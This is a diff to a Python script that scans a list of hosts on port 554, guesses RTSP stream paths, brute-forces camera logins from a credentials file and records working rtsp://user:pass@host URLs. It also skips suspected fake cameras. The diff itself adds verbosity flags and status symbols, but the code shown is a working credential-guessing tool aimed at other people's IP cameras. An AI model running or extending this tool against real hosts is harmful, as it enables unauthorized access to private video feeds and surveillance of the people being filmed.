@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 from concurrent.futures import ThreadPoolExecutor as TPE
 from functools import partial
+from inspect import classify_class_attrs
 import re
 import socket as so
 from time import sleep
@@ -11,6 +12,24 @@ from lib.utils import tim
 
 
 status_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')
+
+verbose = 0
+
+# cam
+C_FOUND = '@'
+C_FAKE = '~'
+
+# brute
+C_OK = '+'
+C_FAIL = '-'
+
+# errors
+C_REFUSED = 'x'
+C_SLOW = 't'
+C_RETRY = 'r'
+C_FUC_UP = 'f'
+C_NOT_RTSP = '?'
+C_TMOF = '%'
 
 
 def wrire_result(res):
@@ -36,30 +55,43 @@ def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout
                 response = s.recv(1024).decode()
                 return int(status_re.findall(response)[0])
         except so.timeout:
+            if verbose:
+                print(C_SLOW, end='', flush=True)
             break  # slowpoke, 3ff0ff
         except IOError as e:
             # 111 refused
             if e.errno == 111:
+                if verbose:
+                    print(C_REFUSED, end='', flush=True)
+
                 break
 
             # 104 reset by peer
             if e.errno == 104:
                 if tries <= 0:
                     # print('u', end='', flush=True)
+                    if verbose:
+                        print(C_FUC_UP, end='', flush=True)
                     break  # host f*ckup?
                 sleep(2 / tries)
                 tries -= 1
+                if verbose > 1:
+                    print(C_RETRY, end='', flush=True)
                 continue
 
             # too many open files
             if e.errno == 24:
                 sleep(0.15)
+                if verbose > 1:
+                    print(C_TMOF, end='', flush=True)
                 continue
             break
 
         except KeyboardInterrupt:
             raise
         except IndexError:
+            if verbose:
+                print(C_NOT_RTSP, end='', flush=True)
             break
         except Exception as e:
             print('Unknown error:', e, 'please, contact with dev')
@@ -70,11 +102,11 @@ def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout
 def check_cred(host, port, path, cred):
     code = rtsp_req(host, port, path, cred)
     if code == 200:
-        print('+', end='', flush=True)
+        print(C_OK, end='', flush=True)
         return f'rtsp://{cred}@{host}:{port}{path}'
 
     if code >= 500:
-        print('-', end='', flush=True)
+        print(C_FAIL, end='', flush=True)
         return
 
     return ''
@@ -84,11 +116,12 @@ def check_path(host, port, path):
     code = rtsp_req(host, port, path)
 
     if code >= 500:
-        print('-', end='', flush=True)
+        print(C_FAIL, end='', flush=True)
         return
 
     if code not in [200, 401, 403]:
-        # print('.', end='', flush=True)
+        if verbose == 3:
+            print('.', end='', flush=True)
         return ''
 
     with open('./data/rtsp_creds.txt') as f:
@@ -116,16 +149,19 @@ def check_host(host):
                 return
 
             if '0h84d' in rr:
-                print('~', end='', flush=True)  # fake cam
+                print(C_FAKE, end='', flush=True)  # fake cam
                 return
 
             if rr:
                 wrire_result(rr)
-                print('@', end='', flush=True)
+                print(C_FOUND, end='', flush=True)
                 return rr  # first valid path is enough now
 
 
-def main():
+def main(v=False, vv=False, vvv=False):
+    global verbose
+    verbose = 3 if vvv else 2 if vv else 1 if v else 0
+
     with open('./local/hosts_554.txt') as f:
         hosts = [ln.rstrip() for ln in f]
 
